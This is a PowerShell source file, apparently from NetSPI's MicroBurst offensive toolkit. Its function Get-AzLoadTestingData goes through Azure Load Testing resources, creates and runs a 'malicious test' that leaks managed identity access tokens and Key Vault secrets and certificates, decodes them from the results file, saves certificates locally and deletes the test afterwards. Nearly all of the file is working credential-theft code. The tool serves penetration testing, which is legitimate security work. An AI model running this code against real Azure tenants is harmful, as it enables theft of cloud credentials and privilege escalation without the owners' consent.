<#
    File: Get-AzLoadTestingData.ps1
    Author: Karl Fosaaen (@kfosaaen), NetSPI - 2025
    Description: PowerShell functions for dumping Key Vault Credentials and Managed Identity tokens from Azure Load Testing resources
#>

function Get-AzLoadTestingData{

<#
    .SYNOPSIS
        PowerShell function for dumping dumping Key Vault Credentials (Secrets and Certificates) and Managed Identity tokens from Azure Load Testing resources.
	.DESCRIPTION
        The function will dump Key Vault Credentials (Secrets and Certificates) and Managed Identity tokens from Azure Load Testing resources
    .PARAMETER Subscription
        Subscription to use.
    .PARAMETER folder
        The folder to output to.
    .PARAMETER SaveTestFile
        Boolean option to save the test files from the load testing service
    .PARAMETER Type
        Ability to select JMX or Locust type of test
    .EXAMPLE
        PS C:\> Get-AzLoadTestingData -Verbose -SaveTestFile $true
        VERBOSE: Logged In as testaccount@example.com
        VERBOSE: Dumping Load Testing Accounts from the "Testing Resources" Subscription
        VERBOSE: 	2 Load Testing Resources Enumerated
        VERBOSE: 		4 Tests enumerated for the notarealtestload resource
        VERBOSE: 			Processing the "Test_3/11/2025_6:56:08 PM" test
        VERBOSE: 				File saved locally to C:\notarealtestload-f36b661f-c97c-41ac-a695-8467c5e3146f-microburst.jmx
        VERBOSE: 			Processing the "Local" test
        VERBOSE: 				File saved locally to C:\notarealtestload-ca3011cf-ca1f-45a8-8e91-b151878ca00b-url_test.jmx
        VERBOSE: 			Processing the "Test" test
        VERBOSE: 				File saved locally to C:\notarealtestload-ec7c7079-6a25-4723-9aaa-a6c408bac059-additional.jmx
        VERBOSE: 			Processing the "Test_3/11/2025_3:44:30 PM" test
        VERBOSE: 				File saved locally to C:\notarealtestload-f36b661f-c97c-41ac-a695-8467c5e3103a-url_test.jmx
        VERBOSE: 			1 Secret(s) and 1 Certificate(s) gathered for extraction from the notarealtestload resource
        VERBOSE: 			SystemAssigned Managed Identity associated with the notarealtestload resource
        VERBOSE: 			Creating malicious test "microburst (e89daa9c-8ba1-4545-8171-5cf73b85965a)" for the notarealtestload resource
        VERBOSE: 				Malicious test "microburst (e89daa9c-8ba1-4545-8171-5cf73b85965a)" created
        VERBOSE: 				Malicious test file uploaded
        VERBOSE: 					Waiting 15 seconds for file validation...
        VERBOSE: 				Malicious test file validated
        VERBOSE: 				Starting malicious test
        VERBOSE: 				Waiting on test results...
        VERBOSE: 					Current Status: PROVISIONING
        VERBOSE: 								Waiting 30 seconds for test results...
        [Truncated]
        VERBOSE: 					Current Status: EXECUTING
        VERBOSE: 								Waiting 30 seconds for test results...
        VERBOSE: 					Test completed - Generating test results
        VERBOSE: 				Getting test results
        VERBOSE: 				Certificate saved locally to C:\testcert.pfx
        VERBOSE: 				Test deleted
        VERBOSE: 		Completed dumping of the notarealtestload resource
        VERBOSE: 		No tests enumerated for the noIdentity resource
        VERBOSE: Completed dumping of the "Testing Resources" Subscription


        Type      : Secret
        Name      : testsecret
        Value     : it'sasecret
        Link      : https://notarealvault.vault.azure.net/secrets/TestSecret/ca1c30f0112044a1ae9a89f4b6b2eed7
        ManagedID : SystemAssigned

        Type      : Secret
        Name      : test2
        Value     : it'sanothersecret
        Link      : https://notarealvault.vault.azure.net/secrets/TestSecret2/042da8617f994f68b0c97fd1fdb63305
        ManagedID : SystemAssigned

        Type      : Certificate
        Name      : testcertificate
        Value     : MIIKOAIBAzCCCfQGCSqGSIb3DQEHAaCCCeUE...
        Link      : https://notarealvault.vault.azure.net/certificates/testcertificate/f2e695f3156d49e4a3ebdb9f6c0a8a9d
        ManagedID : SystemAssigned

        Type      : Variable
        Name      : ENV_VAR
        Value     : testvariable
        Link      : N/A
        ManagedID : N/A

        Type      : Token
        Name      : https://management.azure.com/
        Value     : eyJ0.[TRUNCACTED].mlQ
        Link      : N/A
        ManagedID : 81b94dca-a65e-489b-bf87-1bf17ff48dad
    .LINK
        https://learn.microsoft.com/en-us/rest/api/loadtesting/dataplane/load-test-run/create-or-update-test-run?view=rest-loadtesting-dataplane-2022-11-01&tabs=HTTP
    .LINK
        https://learn.microsoft.com/en-us/azure/load-testing/how-to-parameterize-load-tests?tabs=jmeter
    .LINK
        https://learn.microsoft.com/en-us/rest/api/loadtesting/dataplane/load-test-administration?view=rest-loadtesting-dataplane-2022-11-01
#>

<#
    Unsupported Edge Cases:
        * Multiple tests with different certificates
            * Example: Test 1 uses Cert 1 - Test 2 uses Cert 2
            * Current script logic will use the first available cert, but tests are limited to one cert per test
            * Additional certs are logged with their KV URL and Managed ID type, the values just show as "Not Extracted"
            * You will need to manually create additional tests to cover the additional certificates that you want to extract
        * Multiple Managed Identities in use
            * Both System Assigned and User Assigned identities attached to the resource
            * Or multiple User Assigned identities attached
            * The logic here gets way too complex and it's easier to manually create a test case to cover this
        * Multiple Tests with Different User Assigned identities for each test
            * Kind of falls into the above, but if one test uses UA-MI #1 and the other uses UA-MI #2, then the logic breaks in the script
            * Again probably easier to manually create a test case to cover this
#>


    [CmdletBinding()]
    Param(
        [Parameter(Mandatory=$false,
        HelpMessage="Subscription to use.")]
        [string]$Subscription = "",
        [Parameter(Mandatory=$false,
        HelpMessage="Save the test files to the local folder.")]
        [bool]$SaveTestFile = $false,        
        [Parameter(Mandatory=$false,
        HelpMessage="Folder to output to.")]
        [string]$Folder = "",
        [parameter(Mandatory=$false,
        HelpMessage="Select a test file type - JMX or Locust.")]
        [ValidateSet("JMX","Locust")]
        [String]$Type = "JMX"
    )

    # Check to see if we're logged in
    $LoginStatus = Get-AzContext
    $accountName = ($LoginStatus.Account).Id
    if ($LoginStatus.Account -eq $null){Write-Warning "No active login. Prompting for login." 
        try {Connect-AzAccount -ErrorAction Stop}
        catch{Write-Warning "Login process failed."}
        }
    else{}
    

    # Subscription name is technically required if one is not already set, list sub names if one is not provided "Get-AzSubscription"
    if ($Subscription){        
        Select-AzSubscription -SubscriptionName $Subscription | Out-Null
    }
    else{
        # List subscriptions, pipe out to gridview selection
        $Subscriptions = Get-AzSubscription -WarningAction SilentlyContinue
        $subChoice = $Subscriptions | Out-GridView -Title "Select One or More Subscriptions" -PassThru
        foreach ($sub in $subChoice) {Get-AzLoadTestingData -Subscription $sub -folder $folder -SaveTestFile $SaveTestFile -Type $Type}
        return
    }

    Write-Verbose "Logged In as $accountName" 

    # Check Folder Path
    if ($folder -ne ""){
        if(Test-Path $folder){}
        else{New-Item -ItemType Directory $folder | Out-Null}
    }
    else{$folder = $PWD.Path}

    # Stop the change warnings
    Update-AzConfig -DisplayBreakingChangeWarning $false | Out-Null

    #Get list of Load Testing Resources
    Write-Verbose "Dumping Load Testing Accounts from the `"$((get-azcontext).Subscription.Name)`" Subscription"
    $loadTesters = Get-AzLoad
    Write-Verbose "`t$($loadTesters.Count) Load Testing Resources Enumerated"

    # Create data table to house results
    $TempTbl = New-Object System.Data.DataTable 
    $TempTbl.Columns.Add("Type") | Out-Null
    $TempTbl.Columns.Add("Name") | Out-Null
    $TempTbl.Columns.Add("Value") | Out-Null
    $TempTbl.Columns.Add("Link") | Out-Null
    $TempTbl.Columns.Add("ManagedID") | Out-Null

    # Get the token - Fixed Secure String Casting here
    $AccessToken = (Get-AzAccessToken -ResourceUrl "https://cnt-prod.loadtesting.azure.com/")
    if ($AccessToken.Token -is [System.Security.SecureString]) {
        $ssPtr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($AccessToken.Token)
        try {
            $token = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($ssPtr)
        } finally {
            [System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($ssPtr)
        }
    }
    else {
        $token = $AccessToken.Token
    }

    # Iterate through the load tester resources
    $loadTesters | ForEach-Object{

        $currentLoadTester = $_.Name
        $endpoint = $_.DataPlaneUri

        # Get Test List
        $testList = ((Invoke-WebRequest -Uri (-join("https://",$endpoint,"/tests?api-version=2022-11-01")) -Verbose:$false -Headers @{ Authorization ="Bearer $token"} -UseBasicParsing).content | ConvertFrom-Json).value

        if($testList.Count -gt 0){

            Write-Verbose "`t`t$($testList.Count) Test(s) enumerated for the $currentLoadTester resource"

            # Secrets and Certs Lists
            $newSecrets = @{}
            $newCertificates = @{}

            $testList | ForEach-Object{
                $testIDfull = ((Invoke-WebRequest -Uri (-join("https://",$endpoint,"/tests/",$_.testId,"?api-version=2022-11-01")) -Verbose:$false -Headers @{ Authorization ="Bearer $token"}).content | ConvertFrom-Json)
                $currentTestID = $_.testId
                Write-Verbose "`t`t`tProcessing the `"$($testIDfull.displayName)`" test"

                # For each test, get the JMX Url            
                $testIDinfo = $testIDfull.inputArtifacts.testScriptFileInfo 
                $urlList = $testIDinfo | select url,fileName
            
                $secretList = $testIDfull | select secrets
                $certList = $testIDfull | select certificate
                $varList = ($testIDfull | select environmentVariables).environmentVariables

                # Check the Managed Identities
                if($testIDfull.keyvaultReferenceIdentityType -match "UserAssigned"){
                    $midType = $testIDfull.keyvaultReferenceIdentityId
                }
                else{$midType = $testIDfull.keyvaultReferenceIdentityType}

                # For each URL, get the file and save it locally            
                if($SaveTestFile -eq $true){
                    $urlList | ForEach-Object{
                        Invoke-WebRequest -Uri $_.url -OutFile (-join($folder,"\",$currentLoadTester,"-",$currentTestID,"-",$_.fileName)) -Verbose:$false
                        Write-Verbose "`t`t`t`tFile saved locally to $((-join($folder,"\",$currentLoadTester,"-",$currentTestID,"-",$_.fileName)))"
                    }
                }

                # Get the Secret URLs from the test
                $secretList | foreach {
                    $_.psobject.properties | foreach {
                        $_.value | foreach {
                            $_.psobject.properties | foreach {
                                if($null -ne $_.value.value){
                                    try{
                                    # Add Secret to the table
                                    $TempTbl.Rows.Add("Secret",$_.name,"N/A",$_.value.value,$midType) | Out-Null
                                    $newSecrets += @{$($_.name) = @{
                                            value = $_.value.value
                                            type  = "AKV_SECRET_URI"
                                            }
                                        }
                                    }
                                    catch{}
                                }
                            }
                        }
                    }
                }

                # Get the Cert URLs from the test                
                $certlist | ForEach-Object {
                    if($null -ne $_.certificate.value){
                        try{
                            # Add Cert to the table
                            $TempTbl.Rows.Add("Certificate",$_.certificate.name,"Not Extracted",$_.certificate.value,$midType) | Out-Null
                            if($newCertificates.Count -lt 1){
                                $newCertificates += @{
                                    name = $_.certificate.name
                                    value = $_.certificate.value
                                    type  = "AKV_CERT_URI"
                                }
                            }
                            else{write-host -ForegroundColor Yellow "Edge Case - The $currentLoadTester resource has multiple certificates over multiple cases. You will need to manually create a malicious test for the certificate associated with the $currentTestID test."}
                        }
                        catch{}
                    }
                }

                # Get the Variable Values from the test
                $varList | foreach {
                    $_.psobject.properties | foreach {
                        if($null -ne $_.value){
                            # Add Variable to the table
                            $TempTbl.Rows.Add("Variable",$_.name,$_.value,"N/A","N/A") | Out-Null
                        }
                    }
                }

                # Null out for the next loop
                $secretList = $null
                $certList = $null
                $varList = $null

            }

            Write-Verbose "`t`t`t$($newSecrets.Count) Secret(s) and $($newCertificates.name.Count) Certificate(s) gathered for extraction from the $currentLoadTester resource"
            

            # Reference for Identity Settings
            $currentTestObject = (Invoke-AzRestMethod -Path (-join($_.Id,"?api-version=2022-12-01"))).Content | ConvertFrom-Json

            # Check Managed Identity Assignment
            if("None" -notmatch $currentTestObject.identity.type){

                # Managed Identity Workflow
                Write-Verbose "`t`t`t$($currentTestObject.identity.type) Managed Identity associated with the $currentLoadTester resource"

                # If system assigned or user-assigned, go this route
                if(($currentTestObject.identity.type -eq "SystemAssigned") -or ($currentTestObject.identity.type -eq "UserAssigned")){
                    # Create GUID and URL for the new test
                    $testGUID = $((New-Guid).Guid)
                    Write-Verbose "`t`t`tCreating malicious test `"microburst ($testGUID)`" for the $currentLoadTester resource"
                    $newTesturi = "https://$($endpoint)/tests/$($testGUID)?api-version=2024-12-01-preview"

                    # HTTP Headers
                    $headers = @{
                        "Authorization" = "Bearer $token"
                        "Content-Type" = "application/merge-patch+json"
                    }

                    if($Type -eq "Locust"){
                        $newEnvVars += @{
                                    LOCUST_USERS = "1"
                                    LOCUST_SPAWN_RATE = "1"
                                    LOCUST_RUN_TIME  = "60"
                                    LOCUST_HOST = ""
                            }
                    }
                    else{$newEnvVars = @{}}

                    # Set secrets and certs in this body
                    $body = @{
                        testId = "$testGUID"
                        description = ""
                        displayName = "microburst"
                        loadTestConfiguration = @{
                            engineInstances = 1
                            splitAllCSVs = $false
                            regionalLoadTestConfig = $null
                        }
                        kind = $Type
                        secrets = $null
                        certificate = $null
                        environmentVariables = $newEnvVars
                        passFailCriteria = @{
                            passFailMetrics = @{}
                            passFailServerMetrics = @{}
                        }
                        autoStopCriteria = @{
                            autoStopDisabled = $false
                            errorRate = 90
                            errorRateTimeWindowInSeconds = 60
                        }
                        subnetId = $null
                        publicIPDisabled = $false
                        keyvaultReferenceIdentityType = $($currentTestObject.identity.type)
                        keyvaultReferenceIdentityId = $null
                        metricsReferenceIdentityType = $($currentTestObject.identity.type)
                        metricsReferenceIdentityId = $null
                        engineBuiltinIdentityType = $($currentTestObject.identity.type)
                        engineBuiltinIdentityIds = $null
                    } 
            
                    # Add new secrets and certs to the existing 'secrets' hashtable
                    if($newSecrets.Count -ge 1){$body['secrets'] += $newSecrets}
                    if($newCertificates.Count -ne 0){$body['certificate'] += $newCertificates}

                    # Convert to JSON after modifications
                    $jsonBody = $body | ConvertTo-Json -Depth 10

                    # Create the new test
                    Invoke-RestMethod -Uri $newTesturi -Method Patch -Headers $headers -Body $jsonBody -Verbose:$false | Out-Null
                    Write-Verbose "`t`t`t`tMalicious test `"microburst ($testGUID)`" created"

                    # Upload the Script file
                    if($Type -eq "JMX"){$newJMXuri = "https://$endpoint/tests/$testGUID/files/microburst.jmx?fileType=TEST_SCRIPT&api-version=2024-12-01-preview"}
                    else{$newJMXuri = "https://$endpoint/tests/$testGUID/files/microburst.py?fileType=TEST_SCRIPT&api-version=2024-12-01-preview"}

                    $headers = @{
                        "Authorization" = "Bearer $token"
                        "Content-Type" = "application/octet-stream"
                    }

                    # Path to the test script file
                    if($Type -eq "JMX"){$filePath = "$PSScriptRoot\..\Misc\LoadTesting\microburst.jmx"}
                    else{$filePath = "$PSScriptRoot\..\Misc\LoadTesting\microburst.py"}

                    # Read file as a byte array
                    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)

                    # Upload the file
                    Invoke-RestMethod -Uri $newJMXuri -Method Put -Headers $headers -Body $fileBytes -Verbose:$false | Out-Null
                    Write-Verbose "`t`t`t`tMalicious test file uploaded"
                        
                    # Wait for the new test to validate
                    $newJMXstatusuri = "https://$endpoint/tests/$($testGUID)?api-version=2024-12-01-preview"
                    $headers = @{
                        "Authorization" = "Bearer $token"
                    }
                    while((Invoke-RestMethod -Uri $newJMXstatusuri -Verbose:$false -Method Get -Headers $headers).inputArtifacts.testScriptFileInfo.validationStatus -notmatch "VALIDATION_SUCCESS"){
                        Write-Verbose "`t`t`t`t`tWaiting 15 seconds for file validation..."
                        sleep -Seconds 15
                    }

                    Write-Verbose "`t`t`t`tMalicious test file validated"

                    # Run the Test
                    $body = @{
                        testId = "$testGUID"
                        displayName = "microburst"
                        secrets = $null
                        certificate = $null
                        environmentVariables = @{}
                        description = $null
                        loadTestConfiguration = @{
                            optionalLoadTestConfig = $null
                        }
                        debugLogsEnabled = $false
                        requestDataLevel = "NONE"
                    } 
            
                    # Add new secrets and certs to the existing 'secrets' hashtable
                    if($newSecrets.Count -ge 1){$body['secrets'] += $newSecrets}
                    if($newCertificates.Count -eq 1){$body['certificate'] += $newCertificates}

                    $jsonBody = $body | ConvertTo-Json -Depth 10

                    $runGUID = $((New-Guid).Guid)
                    $headers = @{
                        "Authorization" = "Bearer $token"
                        "Content-Type" = "application/merge-patch+json"
                    }
                    $runTesturi = "https://$endpoint/test-runs/$($runGUID)?api-version=2024-12-01-preview"
                    Invoke-RestMethod -Uri $runTesturi -Method Patch -Headers $headers -Body $jsonBody -Verbose:$false | Out-Null

                    Write-Verbose "`t`t`t`tStarting malicious test"


                    # Wait for results While(status -eq...)
                    Write-Verbose "`t`t`t`tWaiting on test results..."

                    # Wait for the test to be marked as "DONE"
                    $newJMXstatusuri = "https://$endpoint/test-runs/$($runGUID)?api-version=2024-12-01-preview"
                    $headers = @{
                        "Authorization" = "Bearer $token"
                    }

                    While((Invoke-RestMethod -Uri $newJMXstatusuri -Verbose:$false -Method Get -Headers $headers).status -notmatch "DONE"){
                        Write-Verbose "`t`t`t`t`tCurrent Status: $((Invoke-RestMethod -Uri $newJMXstatusuri -Verbose:$false -Method Get -Headers $headers).status)"
                        Write-Verbose "`t`t`t`t`t`t`t`tWaiting 30 seconds for test results..."
                        sleep -Seconds 30

                    }
           
                    # Get the Results file
                    $resultsURI = "https://$endpoint/test-runs/?testId=$($testGUID)&api-version=2024-12-01-preview"

                    $headers = @{
                        "Authorization" = "Bearer $token"
                    }
                    Write-Verbose "`t`t`t`t`tTest completed - Generating test results"
                    while ($null -eq $resultsFileURI){
                        $resultsFileURI = ((Invoke-RestMethod -Verbose:$false -Uri $resultsURI -Method Get -Headers $headers).value | where testRunId -Match $runGUID).testArtifacts.outputArtifacts.resultFileInfo.url
                    }
                    Write-Verbose "`t`t`t`tGetting test results"

                    # Download Zip file of requests
                    Invoke-WebRequest -Uri $resultsFileURI -OutFile $folder"\results.zip" -Verbose:$false | Out-Null

                    # Unzip the file
                    Expand-Archive $folder"\results.zip" -DestinationPath $folder"\results" | Out-Null

                    # Parse the CSV
                    $urlResults = (gc $folder"\results\engine1_results.csv" | ConvertFrom-Csv | select URL | where URL -NE "null" | sort -Unique).url
                    if($Type -eq "JMX"){$b64obj = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($urlResults.Split("?")[1].trimstart('token').trimstart('='))) | ConvertFrom-Json}
                    else{
                        Add-Type -AssemblyName System.Web
                        $decoded = [System.Web.HttpUtility]::UrlDecode($urlResults)
                        $b64obj = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($decoded.Split("?")[1].trimstart('token').trimstart('='))) | ConvertFrom-Json
                    }

                    # Put the tokens/secrets into the output
                    if($Type -eq "JMX"){$TempTbl.Rows.Add("Token",$($b64obj.token | ConvertFrom-Json).resource,$($b64obj.token | ConvertFrom-Json).access_token,"N/A",$($b64obj.token | ConvertFrom-Json).client_id) | Out-Null}
                    else{$TempTbl.Rows.Add("Token",$($b64obj.token.resource),$($b64obj.token.access_token),"N/A",$($b64obj.token.client_id)) | Out-Null }

                    # Parse the secrets from the env vars
                    ForEach($line in $b64obj.environment){
                        # Iterate the secret values
                        $TempTbl | ForEach-Object{
                            if($line -match $($_.Name)){
                                #$_.Value =($line.Split('=')[1..$($line.Split('=').length)] | Out-String)
                                $row = $TempTbl.Select("Name = '$($_.Name)'")
                                if ($row.Count -gt 0) {
                                    $row[0].Value = ($line.Split('=')[1..$($line.Split('=').length)] | Out-String).Trim()
                                }
                            }
                        }
                    }

                    # If a cert, add it and save the pfx locally
                    if($b64obj.cert){
                        $row = $TempTbl.Select("Type = 'Certificate'")
                        if ($row.Count -gt 0) {
                            $row[0].Value = ($b64obj.cert | Out-String)
                            [IO.File]::WriteAllBytes("$folder\$($row.Name).pfx",[Convert]::FromBase64String($($b64obj.cert | Out-String)))
                            Write-Verbose "`t`t`t`t`tCertificate saved locally to $((-join("$folder\",$($row.Name),".pfx")))"
                        }
                    }
                                        
                    # Delete the local files
                    Remove-Item -Recurse $folder"\results"
                    Remove-Item $folder"\results.zip"

                    # Delete the test
                    $headers = @{
                        "Authorization" = "Bearer $token"
                    }
                    Invoke-RestMethod -Verbose:$false -Uri $newTesturi -Method Delete -Headers $headers | Out-Null
                    Write-Verbose "`t`t`t`tTest deleted"
                }
                elseif($currentTestObject.identity.type -eq "SystemAssigned, UserAssigned"){
                    # If both types of identities are in use, then test needs to be manually created
                    Write-Host -ForegroundColor Yellow "Edge Case - The $currentLoadTester resource has a System-Assigned Managed Identity and a User-Assigned Managed Identity associated. We don't expect to see this often, but the logic in our script isn't sophisticated enough to handle that scenario. You will need to manually create the test to exploit this one."
                }
            }
            else{
                Write-Verbose "`t`t`tNo Managed Identities associated with the $currentLoadTester resource"
            }

            Write-Verbose "`t`tCompleted dumping of the $currentLoadTester resource"
        }
        else{Write-Verbose "`t`tNo tests enumerated for the $currentLoadTester resource"}
    }

    # Output the Results Object
    Write-Verbose "Completed dumping of the `"$((get-azcontext).Subscription.Name)`" Subscription"
    $TempTbl

}